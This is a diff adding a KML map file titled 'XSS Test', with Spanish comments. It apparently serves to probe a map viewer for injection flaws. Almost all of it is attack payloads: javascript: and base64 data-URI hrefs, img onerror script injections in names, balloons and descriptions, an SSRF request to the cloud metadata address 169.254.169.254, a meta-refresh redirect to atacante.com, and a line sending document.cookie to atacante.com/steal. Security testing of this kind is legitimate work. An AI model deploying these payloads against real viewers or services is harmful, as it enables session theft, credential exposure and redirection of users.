@@ -1,0 +1,112 @@
+<kml xmlns="http://www.opengis.net/kml/2.2" xmlns:gx="http://www.google.com/kml/ext/2.2" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.opengis.net/kml/2.2 https://developers.google.com/kml/schema/kml22gx.xsd">
+  <Document>
+    <name>XSS Test</name>
+    
+    <!-- 1. XSS en Icon href con javascript: -->
+    <Placemark>
+      <name>Click the icon</name>
+      <Style>
+        <IconStyle>
+          <Icon>
+            <href>javascript:alert(1)</href>
+          </Icon>
+        </IconStyle>
+      </Style>
+      <Point>
+        <coordinates>8.330653965921906,46.529863580494734</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- 2. XSS en Icon href con data: (si javascript: está bloqueado) -->
+    <Placemark>
+      <name>Data URI icon</name>
+      <Style>
+        <IconStyle>
+          <Icon>
+            <href>data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</href>
+          </Icon>
+        </IconStyle>
+      </Style>
+      <Point>
+        <coordinates>8.5,46.5</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- 3. XSS en styleUrl -->
+    <Placemark>
+      <name>Style URL</name>
+      <styleUrl>javascript:alert(1)</styleUrl>
+      <Point>
+        <coordinates>8.6,46.4</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- 4. XSS en Link href (NetworkLink) -->
+    <NetworkLink>
+      <name>NetworkLink XSS</name>
+      <Link>
+        <href>javascript:alert(1)</href>
+      </Link>
+    </NetworkLink>
+
+    <!-- 5. XSS en BalloonStyle text -->
+    <Style id="balloonXSS">
+      <BalloonStyle>
+        <text><![CDATA[<img src=x onerror=alert(1)>]]></text>
+      </BalloonStyle>
+    </Style>
+    <Placemark>
+      <name>Balloon XSS</name>
+      <styleUrl>#balloonXSS</styleUrl>
+      <Point>
+        <coordinates>8.7,46.3</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- 6. XSS en description (aunque lo muestre plano, probar) -->
+    <Placemark>
+      <name>Description XSS</name>
+      <description><![CDATA[<img src=x onerror=alert(1)>]]></description>
+      <Point>
+        <coordinates>8.8,46.2</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- 7. XSS en href de Schema -->
+    <Schema>
+      <href>javascript:alert(1)</href>
+    </Schema>
+
+    <!-- 8. SSRF a metadatos (si href permite HTTP) -->
+    <Placemark>
+      <name>SSRF Test</name>
+      <Style>
+        <IconStyle>
+          <Icon>
+            <href>http://169.254.169.254/latest/meta-data/</href>
+          </Icon>
+        </IconStyle>
+      </Style>
+      <Point>
+        <coordinates>8.9,46.1</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- 9. Redirección con meta refresh (si el visor lo interpreta) -->
+    <Placemark>
+      <name><![CDATA[<meta http-equiv="refresh" content="0;url=https://atacante.com">]]></name>
+      <Point>
+        <coordinates>9.0,46.0</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- 10. Exfiltración de cookies (si ejecuta JS) -->
+    <Placemark>
+      <name><![CDATA[<img src=x onerror="fetch('https://atacante.com/steal?c='+document.cookie)">]]></name>
+      <Point>
+        <coordinates>9.1,45.9</coordinates>
+      </Point>
+    </Placemark>
+
+  </Document>
+</kml>
